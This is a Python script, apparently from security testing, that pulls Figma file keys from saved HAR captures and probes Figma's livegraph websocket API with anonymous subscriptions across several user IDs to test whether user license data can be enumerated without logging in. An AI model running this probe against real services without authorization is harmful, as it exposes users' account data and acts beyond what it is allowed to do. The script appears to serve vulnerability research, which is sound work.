# -*- coding: utf-8 -*-
"""1. HAR 中 A 的全部 file key(检查是否有私有文件)
2. UserLicensesForFile 匿名枚举 userId 能力
"""
import json, re, sys, time, websocket
sys.path.insert(0, 'D:/scan/figma_report')
from _figma_creds import UID_A, UID_B, FILE_A

# ---- 1. HAR 中的文件 key ----
for p in [r'C:\Users\tndc2\Desktop\www.figma.com.har',
          r'C:\Users\tndc2\Desktop\www.figma.com2.har']:
    try:
        h = json.load(open(p, 'r', encoding='utf-8', errors='ignore'))
    except Exception:
        continue
    keys = set()
    for e in h.get('log', {}).get('entries', []):
        u = e.get('request', {}).get('url', '')
        for m in re.finditer(r'/file/([A-Za-z0-9_-]{20,25})', u):
            keys.add(m.group(1))
        for m in re.finditer(r'"key"\s*:\s*"([A-Za-z0-9_-]{20,25})"', json.dumps(e.get('response', {}).get('content', {}))[:2000]):
            keys.add(m.group(1))
    print(p, 'file keys:', sorted(keys))

print()
# ---- 2. 匿名枚举:随机 userId 尝试(看是否返回非空)----
CLIENT_URL = 'https://www.figma.com/file/%s' % FILE_A
url = ('wss://www.figma.com/api/livegraph?pv=1&userId=&anonUserId=&clientType=web'
       '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
       % CLIENT_URL)
ws = websocket.create_connection(url, timeout=8, header=['User-Agent: Mozilla/5.0'])
ws.send(json.dumps({'messageType': 'auth', 'clientType': 'web',
                    'args': {'userId': None, 'anonymousUserId': None},
                    'tags': {'clientType': 'web', 'clientUrl': CLIENT_URL},
                    'clientRequestedVersion': 2}))
time.sleep(0.4)
for uid in [UID_A, UID_B, '311767172', '1000000000000000001', '1', '1666382703778278398', '1666382703778278400']:
    ws.send(json.dumps({'messageType': 'subscribe', 'viewName': 'UserLicensesForFile',
                        'viewHash': 'abababababababababababababababab',
                        'loadType': 'initial', 'args': {'fileKey': FILE_A, 'userId': uid}}))
msgs = []
ws.settimeout(5)
try:
    while True:
        msgs.append(ws.recv())
except Exception:
    pass
ws.close()
for m in msgs:
    try:
        j = json.loads(m)
    except Exception:
        continue
    if j.get('messageType') == 'denormalizedPendingMutations':
        for vk, payload in (j.get('mutations') or {}).items():
            s = json.dumps(payload, ensure_ascii=False)
            mm = re.search(r'"currentPlanUser"[^}]{0,300}', s)
            if mm and 'null' not in mm.group(0)[:60]:
                print('ENUM HIT:', vk[:100])
                print('   ', mm.group(0)[:300])
            else:
                print('no hit:', vk[:100])
